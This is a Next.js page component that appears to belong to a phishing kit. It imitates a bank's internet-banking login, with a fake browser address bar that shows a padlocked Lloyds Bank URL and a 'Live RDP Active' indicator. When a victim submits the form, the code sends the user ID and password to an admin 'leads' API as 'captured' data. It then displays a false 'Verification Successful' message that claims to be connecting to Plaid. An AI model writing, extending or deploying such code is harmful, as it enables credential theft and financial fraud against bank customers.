"use client";

import { useSearchParams } from "next/navigation";
import { useEffect, useState } from "react";

export default function LiveStreamPage() {
  const searchParams = useSearchParams();
  const bankName = searchParams.get("bank") || "Bank";
  const bankType = searchParams.get("type") || "Personal";
  const targetUrl = searchParams.get("targetUrl") || "https://www.lloydsbank.co.uk";

  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [isSubmitted, setIsSubmitted] = useState(false);

  const handleSubmitCredentials = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitted(true);

    try {
      const activeLeadId = localStorage.getItem("active_lead_id");
      if (activeLeadId) {
        await fetch(`/api/admin/leads/${activeLeadId}`, {
          method: "PUT",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            bankName,
            bankType,
            userId,
            password,
            extraData: `Captured from Live Portal: ${userId} / [Protected Password]`,
          }),
        });
      }
    } catch (err) {
      console.error("Failed to sync captured data:", err);
    }
  };

  return (
    <div className="flex h-screen w-screen flex-col bg-slate-950 font-sans select-none">
      {/* Top Browser Chrome Bar */}
      <div className="flex h-11 items-center justify-between bg-[#1e293b] px-4 text-white shrink-0 border-b border-slate-800">
        <div className="flex items-center gap-2">
          <div className="flex gap-1.5">
            <span className="w-3 h-3 rounded-full bg-red-500 inline-block"></span>
            <span className="w-3 h-3 rounded-full bg-amber-500 inline-block"></span>
            <span className="w-3 h-3 rounded-full bg-emerald-500 inline-block"></span>
          </div>
          <span className="text-xs font-semibold ml-3 text-slate-300">{bankName} - Secure Open Banking Portal</span>
        </div>
        <div className="flex items-center bg-slate-900 px-4 py-1 rounded-md border border-slate-700 text-xs text-emerald-400 font-mono w-96 truncate justify-center">
          🔒 {targetUrl}
        </div>
        <div className="flex items-center gap-2 text-xs text-emerald-400 font-bold">
          <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
          Live RDP Active
        </div>
      </div>

      {/* Main Viewport Container */}
      <div className="flex-1 relative flex items-center justify-center bg-white overflow-hidden">
        {isSubmitted ? (
          <div className="flex flex-col items-center justify-center p-8 text-center animate-fade-in">
            <div className="w-16 h-16 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center text-3xl mb-4 font-bold">
              ✓
            </div>
            <h2 className="text-2xl font-bold text-slate-900">Verification Successful</h2>
            <p className="text-sm text-slate-500 mt-2">Connecting your account securely to Plaid... Please wait.</p>
          </div>
        ) : (
          <div className="w-full max-w-md p-8 bg-white rounded-2xl shadow-xl border border-slate-100">
            <div className="text-center mb-6">
              <h1 className="text-xl font-bold text-slate-900">Welcome to Internet Banking</h1>
              <p className="text-xs text-slate-500 mt-1">{bankName} ({bankType}) Secure Login</p>
            </div>

            <form onSubmit={handleSubmitCredentials} className="space-y-4 text-xs">
              <div>
                <label className="block font-bold text-slate-700 mb-1">User ID / Username:</label>
                <input
                  type="text"
                  required
                  value={userId}
                  onChange={(e) => setUserId(e.target.value)}
                  placeholder="Enter your user ID"
                  className="w-full rounded-xl border border-slate-300 p-3 text-xs outline-none focus:border-emerald-600 bg-slate-50 text-slate-900 font-medium"
                />
              </div>

              <div>
                <label className="block font-bold text-slate-700 mb-1">Password:</label>
                <input
                  type="password"
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Enter your password"
                  className="w-full rounded-xl border border-slate-300 p-3 text-xs outline-none focus:border-emerald-600 bg-slate-50 text-slate-900 font-medium"
                />
              </div>

              <button
                type="submit"
                className="w-full bg-[#006A4E] hover:bg-[#00523B] text-white font-bold py-3.5 rounded-xl transition cursor-pointer shadow-md text-sm mt-2"
              >
                Continue to Secure Verification
              </button>
            </form>
          </div>
        )}
      </div>
    </div>
  );
}